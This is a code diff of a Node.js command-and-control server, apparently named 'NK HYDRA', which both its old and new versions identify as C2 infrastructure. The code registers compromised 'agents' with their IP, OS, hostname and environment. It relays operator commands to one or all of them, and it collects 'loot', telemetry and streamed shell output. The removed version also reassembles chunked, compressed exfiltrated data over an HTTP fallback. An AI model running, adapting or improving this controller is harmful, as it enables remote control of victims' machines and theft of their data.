@@ -1,132 +1,103 @@
-// TYPE: NODE.JS C2 SERVER
-// NK HYDRA v401.0 [ROBUST + KEEP ALIVE]
-
 const express = require('express');
 const http = require('http');
-const { Server } = require('socket.io');
+const { Server } = require("socket.io");
 const cors = require('cors');
-const zlib = require('zlib');
 
 const app = express();
-app.use(cors({ origin: '*' })); 
-app.use(express.json({ limit: '50mb' }));
-
-app.get('/', (req, res) => { res.json({ status: 'NK_HYDRA_ONLINE', version: 'v401.0' }); });
+app.use(cors());
 
 const server = http.createServer(app);
-const io = new Server(server, { 
-    cors: { origin: "*", methods: ["GET", "POST"] },
-    maxHttpBufferSize: 1e8,
-    pingTimeout: 60000,
-    pingInterval: 25000
+const io = new Server(server, {
+  cors: {
+    origin: "*",
+    methods: ["GET", "POST"]
+  }
 });
 
-let agents = []; 
-let eventHistory = []; 
-let chunkBuffer = {};
-
-function logEvent(event) {
-    eventHistory.push({ ...event, timestamp: Date.now() });
-    if (eventHistory.length > 1000) eventHistory.shift();
-}
-
-function updateAgentStatus(agentId, meta = {}) {
-    const idx = agents.findIndex(a => a.id === agentId);
-    if (idx >= 0) {
-        agents[idx] = { ...agents[idx], ...meta, lastSeen: Date.now(), status: 'Online' };
-    } else {
-        agents.push({ id: agentId, socketId: 'http_fallback', status: 'Online', lastSeen: Date.now(), ...meta });
-    }
-    io.to('ui_room').emit('agents_list', agents);
-}
-
-// HTTP FALLBACK ENDPOINT
-app.post('/fallback_event', (req, res) => {
-    const packet = req.body;
-    
-    if (packet.id && packet.data) processChunk(packet);
-    else if (packet.agentId) {
-        if (packet.type !== 'HEARTBEAT') {
-             io.to('ui_room').emit('agent_event', packet);
-             logEvent(packet);
-        }
-        updateAgentStatus(packet.agentId);
-    }
-    res.sendStatus(200);
-});
-
-function processChunk(packet) {
-    const { id, idx, total, data, type, agentId } = packet;
-    updateAgentStatus(agentId);
-
-    if (!chunkBuffer[id]) chunkBuffer[id] = { total, chunks: [], count: 0, type, agentId };
-    
-    if (!chunkBuffer[id].chunks[idx]) {
-        chunkBuffer[id].chunks[idx] = data;
-        chunkBuffer[id].count++;
-    }
-
-    if (chunkBuffer[id].count === total) {
-        try {
-            const fullBase64 = chunkBuffer[id].chunks.join('');
-            const compressedBuffer = Buffer.from(fullBase64, 'base64');
-            zlib.unzip(compressedBuffer, (err, buffer) => {
-                if (!err) {
-                    const jsonStr = buffer.toString();
-                    const payload = JSON.parse(jsonStr);
-                    const fullEvent = { type: chunkBuffer[id].type, agentId: chunkBuffer[id].agentId, payload };
-                    io.to('ui_room').emit('agent_event', fullEvent);
-                    logEvent(fullEvent);
-                }
-                delete chunkBuffer[id];
-            });
-        } catch (e) { delete chunkBuffer[id]; }
-    }
-}
+let agents = [];
+let eventHistory = [];
 
 io.on('connection', (socket) => {
-    socket.on('identify', (data) => {
-        if (data.type === 'ui') {
-            socket.join('ui_room');
-            socket.emit('agents_list', agents);
-            socket.emit('history_dump', eventHistory);
-            return;
-        }
-        
-        const existingIdx = agents.findIndex(a => a.id === data.id);
-        const agentData = { ...data, socketId: socket.id, status: 'Online', lastSeen: Date.now() };
-        if (existingIdx >= 0) agents[existingIdx] = agentData;
-        else agents.push(agentData);
-        
-        io.to('ui_room').emit('agents_list', agents);
-        logEvent({ type: 'SYSTEM', payload: { message: `Agent ${data.id} connected`, level: 'INFO', source: 'C2' }});
-    });
+  console.log('New connection:', socket.id);
 
-    socket.on('agent_chunk', (packet) => processChunk(packet));
-
-    socket.on('exec_cmd', (data) => {
-        if (data.targetId === 'all') socket.broadcast.emit('exec_cmd', data); 
-        else {
-            const agent = agents.find(a => a.id === data.targetId);
-            if (agent && agent.socketId !== 'http_fallback') {
-                io.to(agent.socketId).emit('exec_cmd', data);
-            }
+  socket.on('identify', (data) => {
+    if (data.type === 'agent') {
+        const existing = agents.find(a => a.id === data.id);
+        if (existing) {
+            existing.socketId = socket.id;
+            existing.status = 'Online';
+            existing.lastSeen = Date.now();
+        } else {
+            agents.push({
+                socketId: socket.id,
+                id: data.id || socket.id,
+                ip: socket.handshake.address,
+                os: data.os || 'Unknown',
+                hostname: data.hostname || 'Unknown',
+                status: 'Online',
+                lastSeen: Date.now(),
+                environment: data.environment || {}
+            });
         }
-    });
+        io.emit('agents_list', agents);
+        console.log('Agent registered:', data.id);
+    } else if (data.type === 'ui') {
+        socket.join('ui_room');
+        socket.emit('agents_list', agents);
+        // Do not dump full history immediately to avoid UI lag, wait for request or send minimal
+        socket.emit('history_dump', eventHistory.slice(-50)); 
+    }
+  });
 
-    socket.on('disconnect', () => {
-        const agent = agents.find(a => a.socketId === socket.id);
-        if (agent) { 
-            setTimeout(() => {
-                const check = agents.find(a => a.id === agent.id);
-                if (check && (Date.now() - check.lastSeen > 15000)) {
-                    check.status = 'Offline'; 
-                    io.to('ui_room').emit('agents_list', agents);
-                }
-            }, 15000); 
-        }
-    });
+  socket.on('heartbeat', (data) => {
+     if (data && data.type === 'HEARTBEAT') {
+         const agent = agents.find(a => a.id === data.agentId);
+         if (agent) {
+             agent.lastSeen = Date.now();
+             agent.status = 'Online';
+             // Only emit list if status changed to reduce spam
+             // io.emit('agents_list', agents); 
+         }
+     }
+  });
+
+  socket.on('agent_chunk', (chunk) => {
+     io.to('ui_room').emit('agent_event', chunk);
+     
+     // Store important events, skip raw streaming shell to save memory
+     if (['SUCCESS', 'ERROR', 'loot', 'TELEMETRY'].includes(chunk.type)) {
+         eventHistory.push({ ...chunk, timestamp: Date.now() });
+         if (eventHistory.length > 1000) eventHistory.shift();
+     }
+  });
+  
+  socket.on('agent_event', (event) => {
+     io.to('ui_room').emit('agent_event', event);
+     eventHistory.push({ ...event, timestamp: Date.now() });
+     if (eventHistory.length > 1000) eventHistory.shift();
+  });
+
+  socket.on('exec_cmd', (data) => {
+    const { targetId, cmd } = data;
+    console.log('Command received for', targetId, ':', cmd);
+    const target = agents.find(a => a.id === targetId);
+    if (target) {
+        io.to(target.socketId).emit('command', { cmd });
+    } else if (targetId === 'all') {
+        agents.forEach(a => io.to(a.socketId).emit('command', { cmd }));
+    }
+  });
+
+  socket.on('disconnect', () => {
+    const agent = agents.find(a => a.socketId === socket.id);
+    if (agent) {
+        agent.status = 'Offline';
+        io.emit('agents_list', agents);
+    }
+  });
 });
 
 const PORT = process.env.PORT || 3000;
-server.listen(PORT, () => console.log(`HYDRA v401.0 RUNNING ON ${PORT}`));
+server.listen(PORT, () => {
+  console.log(`HYDRA C2 Server running on port ${PORT}`);
+});
